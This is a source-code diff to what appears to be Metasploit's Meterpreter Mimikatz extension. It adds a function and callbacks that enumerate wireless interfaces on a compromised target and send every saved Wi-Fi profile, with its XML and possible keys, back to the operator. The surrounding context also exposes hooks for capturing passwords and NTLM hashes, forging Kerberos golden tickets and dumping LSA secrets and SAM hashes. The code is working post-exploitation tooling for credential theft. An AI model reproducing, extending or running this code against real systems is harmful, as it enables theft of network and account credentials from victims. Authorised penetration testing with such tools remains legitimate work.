@@ -24,6 +24,7 @@
 // strings before passing them back to Metasploit. I wanted to avoid this hence instead I'm tapping into
 // Mimikatz via callback functions.
 #include "modules\kuhl_m_lsadump_struct.h"
+#include "modules\kuhl_m_misc_struct.h"
 #include "modules\kerberos\khul_m_kerberos_struct.h"
 
 typedef void (CALLBACK * PKUHL_M_SEKURLSA_EXTERNAL) (IN CONST PLUID luid, IN CONST PUNICODE_STRING username, IN CONST PUNICODE_STRING domain, IN CONST PUNICODE_STRING password, IN CONST PBYTE lm, IN CONST PBYTE ntlm, IN OUT LPVOID pvData);
@@ -45,6 +46,14 @@ extern LONG kuhl_m_kerberos_use_ticket(PBYTE fileData, DWORD fileSize);
 extern LONG kuhl_m_kerberos_create_golden_ticket(PCWCHAR szUser, PCWCHAR szDomain, PCWCHAR szSid, PCWCHAR szNtlm,
 	DWORD dwId, DWORD* pdwGroups, DWORD dwGroupCount, PBYTE* ticketBuffer, DWORD* ticketBufferSize);
 extern LONG kuhl_m_kerberos_purge_ticket();
+extern LONG kuhl_m_misc_wifi_enum(PWIFI_CALLBACK_CTX callbackCtx);
+
+/* @brief Helper struct that contains the context used when parsing wifi profiles. */
+typedef struct _WIFI_CONTEXT
+{
+	Packet* pResponse;
+	Packet* pInterface;
+} WIFI_CONTEXT, *PWIFI_CONTEXT;
 
 /*!
  * @brief Attempt to determine if the given string is a valid Unicode string.
@@ -592,4 +601,57 @@ DWORD mimikatz_lsa_dump_secrets(Packet* pResponse)
 	callbackCtx.pSamHashHandler = sam_hash_handler;
 
 	return kuhl_m_lsadump_full(&callbackCtx);
+}
+
+VOID StartInterfaceHandler(LPVOID lpCtx, GUID* pGuid, LPCWSTR lpState, LPCWSTR lpDescription)
+{
+	PWIFI_CONTEXT pWifi = (PWIFI_CONTEXT)lpCtx;
+
+	pWifi->pInterface = packet_create_group();
+
+	packet_add_tlv_raw(pWifi->pInterface, TLV_TYPE_KIWI_WIFI_INT_GUID, pGuid, sizeof(GUID));
+	packet_add_tlv_wstring(pWifi->pInterface, TLV_TYPE_KIWI_WIFI_INT_DESC, lpDescription);
+	packet_add_tlv_wstring(pWifi->pInterface, TLV_TYPE_KIWI_WIFI_INT_STATE, lpState);
+}
+
+VOID ProfileHandler(LPVOID lpCtx, LPCWSTR lpProfileName, LPCWSTR lpProfileXml)
+{
+	PWIFI_CONTEXT pWifi = (PWIFI_CONTEXT)lpCtx;
+
+	Packet* pProfile = packet_create_group();
+
+	packet_add_tlv_wstring(pProfile, TLV_TYPE_KIWI_WIFI_PROFILE_NAME, lpProfileName);
+	packet_add_tlv_wstring(pProfile, TLV_TYPE_KIWI_WIFI_PROFILE_XML, lpProfileXml);
+
+	packet_add_group(pWifi->pInterface, TLV_TYPE_KIWI_WIFI_PROFILE, pProfile);
+}
+
+VOID EndInterfaceHandler(LPVOID lpCtx)
+{
+	PWIFI_CONTEXT pWifi = (PWIFI_CONTEXT)lpCtx;
+
+	packet_add_group(pWifi->pResponse, TLV_TYPE_KIWI_WIFI_INT, pWifi->pInterface);
+	pWifi->pInterface = NULL;
+}
+
+/*!
+ * @brief Enumerate/list wifi profiles on the target.
+ * @param pResponse Pointer to the packet that will contain the response.
+ * @returns Indication of success or failure.
+ */
+DWORD mimikatz_wifi_profile_list(Packet* pResponse)
+{
+	WIFI_CALLBACK_CTX callbackCtx;
+	WIFI_CONTEXT ctx;
+	ZeroMemory(&callbackCtx, sizeof(callbackCtx));
+	ZeroMemory(&ctx, sizeof(ctx));
+
+	ctx.pResponse = pResponse;
+
+	callbackCtx.lpCtx = &ctx;
+	callbackCtx.pStartInterfaceHandler = StartInterfaceHandler;
+	callbackCtx.pEndInterfaceHandler = EndInterfaceHandler;
+	callbackCtx.pProfileHandler = ProfileHandler;
+
+	return kuhl_m_misc_wifi_enum(&callbackCtx);
 }
